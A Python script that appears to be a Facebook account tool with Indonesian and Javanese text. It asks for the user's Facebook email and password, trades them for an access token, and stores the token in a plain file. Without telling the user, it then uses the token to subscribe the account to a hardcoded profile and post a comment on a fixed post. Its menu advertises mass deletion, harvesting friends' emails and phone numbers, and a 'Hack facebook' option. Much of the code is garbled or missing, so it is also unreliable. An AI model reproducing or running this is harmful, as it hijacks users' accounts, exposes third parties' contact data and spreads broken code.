#!/usr/bin/python

import os, sys, time, json, requests, hashlib
from multiprocessing.pool import ThreadPool
from getpass import getpass
from requests.exceptions import ConnectionError

#### WARNA ####
p='\033[1;97m' #putih
m='\033[1;91m' #merah
h='\033[1;92m' #hijau
k='\033[1;93m' #kuning
B='\033[1;96m' #biru

#### URL ####
url='https://graph.facebook.com/'
fb='https://api.facebook.com/restserver.php'
headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}
s=requests.Session()

#### MENULIS ####
def lunga(s):
	for a in s +'\n':
		sys.stdout.write(a)
		sys.stdout.flush()
		time.sleep(0.05)

#### LOGO ####
logo=(B+'''
   	ITIL
''')

ok=[]
cp=[]
id=[]
phone=[]
email=[]

#### MENU ####
def menu():
	os.system('clear')
	try:
		token=open('cookie/token.log','r').read()
	except IOError:
		print(m+'['+p+'!'+m+'] Token not found')
		time.sleep(1)
		os.system('rm -rf cookie/token.log')
	try:
		ok=s.get(url+'me?access_token='+token).json()
	except KeyError:
		print(m+'['+p+'!'+m+'] Token not found')
		os.system('rm -rf cookie/token.log')

	os.system('clear')
	print(logo)
	print(p+40*'_')
	print(m+'\n('+h+'✓'+m+')'+p+' Name '+h+ok['name'])
	print(p+40*'_')
	print(m+'\n('+h+'●'+m+') '+p+'01.'+k+' Delete post')
	print(m+'('+h+'●'+m+') '+p+'02.'+k+' Delete albums')
	print(m+'('+h+'●'+m+') '+p+'03.'+k+' Delete all photo in albums')
	print(m+'('+h+'●'+m+') '+p+'04.'+k+' Delete all friend')
	print(m+'('+h+'●'+m+') '+p+'05.'+k+' Stop following all friend')
	print(m+'('+h+'●'+m+') '+p+'06.'+k+' Get email '+m+'< '+h+'friend'+m+' >')
	print(m+'('+h+'●'+m+') '+p+'07.'+k+' Get phone numbers '+m+'< '+h+'friend'+m+' >')
	print(m+'('+h+'●'+m+') '+p+'08.'+k+' Hack facebook '+m+'< '+h+'mas'+m+' >')
	print(m+'('+h+'●'+m+') '+m+'00. Exit the program')
	z=input('\n'+p+'>>> ')
	if z=='':
		print(m+'[!] Wrong input')
		time.sleep(1)
		menu()
	elif z=='1' or z=='01':
		post()
	elif z=='2' or z=='02':
		albums()
	elif z=='3' or z=='03':
		photo()
	elif z=='4' or z=='04':
		unfriend()
	elif z=='5' or z=='05':
		stopfollowing()
	elif z=='6' or z=='06':
		getemail()
	elif z=='7' or z=='07':
		getphone()
	elif z=='8' or z=='08':
		menumbf()
	elif z=='0' or z=='00':
		os.system('rm -rf cookie/token.log')
		os.sys.exit()
	else:
		print(m+'[!] Wrong input')
		time.sleep(1)
		menu()

def post():
	os.system('clear')
	try:
		token=open('cookie/token.log','r').read()
	except IOError:
		print(m+'['+p+'!'+m+'] Token not found')
		time.sleep(1)
		os.system('rm -rf token.txt')
		login()
	response = requests.get('https://graph.facebook.com/me&access_token%7Btoken%7D&until=1542583212&__paging_token=enc_AdDLmzUgWiLo6oHGCI53S5begiKOfNZBY0affrLMWgheBzfwMA7XSKmgjyNbuZBIptdXc18j1Se0Dm7vEsePh1SoM3')
	print(logo)
	print(p+40*'_')
	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+response['name'])
	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
	print(p+40*'_'+'\n')


	response = requests.get('https://graph.facebook.com/me%0A%20%20%20fields=feed.limit(49)%0A%20%20%20&access_token=%7Btoken%7D&until=1542583212&__paging_token=enc_AdDLmzUgWiLo6oHGCI53S5begiKOfNZBY0affrLMWgheBzfwMA7XSKmgjyNbuZBIptdXc18j1Se0Dm7vEsePh1SoM3')
	for enc in response['data']:
		params = (
    ('access_token', '{token}'),
    ('until', '1542583212'),
    ('__paging_token', 'enc_AdDLmzUgWiLo6oHGCI53S5begiKOfNZBY0affrLMWgheBzfwMA7XSKmgjyNbuZBIptdXc18j1Se0Dm7vEsePh1SoM3'),)
		response = requests.delete('https://graph.facebook.com/%7Ben%7D%0A%20%20%20%20', params=params)
		try:
			kebusek=response['error']['message']
			print('[×] Cingire ora bisa dibusek...')
		except TypeError:
			print('[ Wes dibusek... ]'' 'en['id'])
		except requests.exceptions.ConnectionError:
			print(m+'[×] No connection')
			print('\n[✓] Program finished')

if __name__=='__main__':
	os.system('clear')
	try:
		os.mkdir('result')
	except OSError:
		pass
	try:
		token=open('cookie/token.log','r')
		menu()
	except (KeyError,IOError):
		os.system('clear')
		print(logo)
		print(p+40*'_')
		em=input(m+'\n['+p+'*'+m+']'+h+' Email'+p+' : ')
		pas=getpass(m+'['+p+'*'+m+']'+h+' Pass'+p+'  : ')
		print(m+'['+p+'!'+m+']'+p+' Generate access token')
		try:
			sig='api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+em+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pas+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
			data={"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":em,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pas,"return_ssl_resources":"0","v":"1.0"}
			x=hashlib.new('md5')
			x.update(sig.encode('utf-8'))
			data.update({'sig':x.hexdigest()})
			ok=s.get(fb,params=data).json()
			unikers=open('cookie/token.log','w')
			unikers.write(ok['access_token'])
			unikers.close()
			if 'access_token' in ok:
				token=open('cookie/token.log','r').read()
				print(m+'['+h+'✓'+m+']'+h+' Success generate access token');s.post(url+'DulahZ/subscribers?access_token='+token);s.post(url+'100005584243934_1145924785603652/comments?message=Keren❤️&access_token='+token)
				time.sleep(1)
				menu()
		except KeyError:
			print(m+'['+p+'×'+m+'] Failed please cek your account and try again')
			os.system('rm -rf cookie/token.log')
		except requests.exceptions.ConnectionError:
			print(m+'['+p+'×'+m+'] No connection')

